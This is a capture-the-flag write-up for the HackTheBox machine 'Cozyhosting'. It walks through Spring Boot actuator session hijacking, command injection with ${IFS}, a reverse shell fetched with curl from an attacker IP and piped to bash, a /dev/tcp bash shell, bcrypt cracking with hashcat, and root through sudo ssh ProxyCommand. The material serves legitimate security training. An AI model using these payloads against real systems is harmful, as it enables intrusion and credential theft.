---
title: "Cozyhosting"
link: "https://www.hackthebox.com/machines/cozyhosting"
description: "A very simple HTB seasonal."
author: "hackthebox"
date: "2023-09-04"
published: true
tags: ["capture the flag", "hackthebox", "web"]
---

# Cozyhosting

<aside>
<a href={link}>{title} @ {author}</a><br/>
A straightfoward boot-to-root HackTheBox seasonal machine.
</aside>

## Recon

Using `rustscan`, we can perform a very quick port scan to pick up any open ports (which we can pass on to `nmap` for further evaluation if need be).
The scan returns open ports on 80 and 22 (HTTP & SSH), which is common for servers hosting web applications.

### HTTP service

A quick look over the HTTP service on port 80, we see it responds with a `Whitelabel Error Page` when a request yields an error status code.

![whitelabel_error.png](/img/cozyhosting_img/whitelabel_error.png)

A quick google search for this indicates that we are being shown a default error page for the `Spring Boot` framework.

![spring.png](/img/cozyhosting_img/spring.png)

[The Spring framework has `Actuator` endpoints](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators) - intended for debugging purposes - though we can gather a lot of useful information (or even vulnerability-dependent code execution)
if they are available to us.  The `/actuator` route tells us that a handful of debugging endpoints are enabled, and we're able to access *most* of them.

![actuator_dir.png](/img/cozyhosting_img/actuator_dir.png)

Enumerating each endpoint involved navigating to the URI, examining the content, and attempting to utilize any relevant information in requests. This strategy seems like it was the best route here, as trying to write a script to automate keyword collection
would likely be far less efficient given I'm not entirely sure what I'm looking for.

We arrive at the /actuator/mappings endpoint, which lists application mappings. Among these, we notice a route to a ‘sessions’ endpoint, potentially revealing active session information.

![mappings.png](/img/cozyhosting_img/mappings.png)

## Initial access

On this actuator endpoint, rather than getting ****just**** usernames, we are given what is likely a session token for a user named `kanderson`

![sess](/img/cozyhosting_img/sessions.png)

I had already replaced my assigned cookie with kanderson's in Chrome in the screenshot above, but the concept remains the same.

Impersonating `kanderson`, we can go back to the login page and refresh it to be redirected to the admin dashboard. Here we see an automatic patching tool for an `ssh` service.

![admin-panel.png](/img/cozyhosting_img/admin-panel.png)

Trying to create a direct connection back to our machine throws a timeout error, even with `sshd` running - maybe on account of a private key mismatch (though it was probably not intended to ever *actually* function considering it was purpose-built for a CTF), but we can tell from the error URL parameters that the app is running `ssh` commands directly from a shell:

![ssh-params](/img/cozyhosting_img/ssh-params.png)

Strings from a `ssh` shell error

![redirect](/img/cozyhosting_img/redirect-showing-bash.png)

Confirmed by the error output, which contains the entire output of a `ssh` error

## Execution

So it would seem that not only are we executing a direct command onto the target system, but the automatic patching tool also doesn't escape malicious strings. It *does* execute our input prepended with `ssh`, but this is pretty trivial to bypass.

The solution I used here was to write a reverse shell script to a file and serve it over a python `http.server`. We can then `curl` its contents from the CMS, and finally pipe to bash to execute it.

This task was slightly more challenging than writing this as a URL-safe sequence because character encodings such as %20 or + disrupted our commands upon reaching the shell.
However, we can use the shell variable `${IFS}`, which will evaluate out to the tab, space, and newline characters, allowing us to effectively indicate the border of each command or argument.

```bash
host=n&username=%3bcurl${IFS}<http://10.10.14.40:9990/hello.sh|/bin/bash%3b${IFS}>
```

`$ cat hello.sh`

```bash
/bin/bash -i >& /dev/tcp/10.10.14.40/9999 0>&1
```

> Note that this method could probably be simplified; this is just what wound up working for me in the moment.
>

![reverse-shell-success](/img/cozyhosting_img/reverse-shell-success.png)

We can copy the `.jar` file from the remote machine to ours to browse it's filesystem; I assume this is what the HTTP service uses as its designated file system (Spring Boot is a Java-based application), though I've never developed web services with Java, though `JAR`, being a contraction of "Java archive", can be extracted with an archive utility into a (partially) readable filesystem - though we aren't performing a decompilation, so we won't get 100% readable source.

Regardless, we will download and extract the archive:

```bash
(remote) app@cozyhosting:/app$ ls -la
total 58856
drwxr-xr-x  2 root root     4096 Aug 14 14:11 .
drwxr-xr-x 19 root root     4096 Aug 14 14:11 ..
-rw-r--r--  1 root root 60259688 Aug 11 00:45 cloudhosting-0.0.1.jar
(remote) app@cozyhosting:/app$
(local) pwncat$ download cloudhosting-0.0.1.jar .
cloudhosting-0.0.1.jar ... 100.0% • 60.3/60.3 MB • 2.3 MB/s • 0:00:00[06:55:08] downloaded 60.26MiB in 27.64 seconds
```

Going through them by hand, the files within are *mostly* readable as is - enough to see Postgres credentials in the `application.properties` file, at least:

```toml
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled=true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

## Privilege escalation

Returning to our ssh session, we can connect to the PostgreSQL database to explore available data. I've never used Postgres until this point, so it was a little cursed having to navigate the database by hand, but I ultimately got there:


```bash

$ (remote) app@cozyhosting:/app$ psql -h localhost -U postgres

[...]

postgres=# \\\\list
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)

postgres=# \\\\c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
cozyhosting=# \\\\d
              List of relations
 Schema |     Name     |   Type   |  Owner
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)

cozyhosting=# SELECT password FROM users;
                           password
--------------------------------------------------------------
 $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
 $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
(2 rows)

cozyhosting=# SELECT name FROM users;
   name
-----------
 kanderson
 admin
(2 rows)
```

That looks like a `bcrypt` hash, so I will run it through `hashcat` against `rockyou`.

```bash
$ hashcat -a 0 -m 3200  ../bcrypt-cozy.txt ../rockyou.txt

[...]

Host memory required for this attack: 49 MB

Dictionary cache built:
* Filename..: ../rockyou.txt
* Passwords.: 14344394
* Bytes.....: 139922213
* Keyspace..: 14344387
* Runtime...: 0 secs

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib...kVO8dm
Time.Started.....: Tue Sep 05 07:20:52 2023 (5 secs)
Time.Estimated...: Tue Sep 05 07:20:57 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (../rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      504 H/s (5.31ms) @ Accel:2 Loops:8 Thr:12 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2880/14344387 (0.02%)
Rejected.........: 0/2880 (0.00%)
Restore.Point....: 2520/14344387 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: biscuit -> soccer9
Hardware.Mon.#1..: Temp: 51c Fan: 19% Util: 97% Core:1923MHz Mem:4006MHz Bus:16

Started: Tue Sep 05 07:20:44 2023
Stopped: Tue Sep 05 07:20:59 2023
```

So our gathered credentials from the database are `admin`:`manchesterunited` .

### Privilege Escalation | User

After `cat`ing out the `/etc/passwd` file to see users with a `/home` directory, we land on the username `josh`. We can test out the `admin` password for `josh`:

```bash
cozyhosting=# exit
could not save history to file "/home/app/.psql_history": No such file or directory
(remote) app@cozyhosting:/app$ su josh
Password:
josh@cozyhosting:/app$ cd ~
josh@cozyhosting:~$ ls
user.txt
josh@cozyhosting:~$ cat user.txt
7d21d6bcbd68d25a92908bf5290b1a69
```

### Privilege Escalation | Root

Finally, lets see what privilege escalation options might be available to us before enumerating with `linpeas.sh`:

```bash
(remote) josh@cozyhosting:/tmp$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

As we can run the `ssh` binary as `root` with sudo, we can use a pretty simple payload from `gtfobins` to grab our final flag.

```bash
(remote) josh@cozyhosting:/tmp$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
```
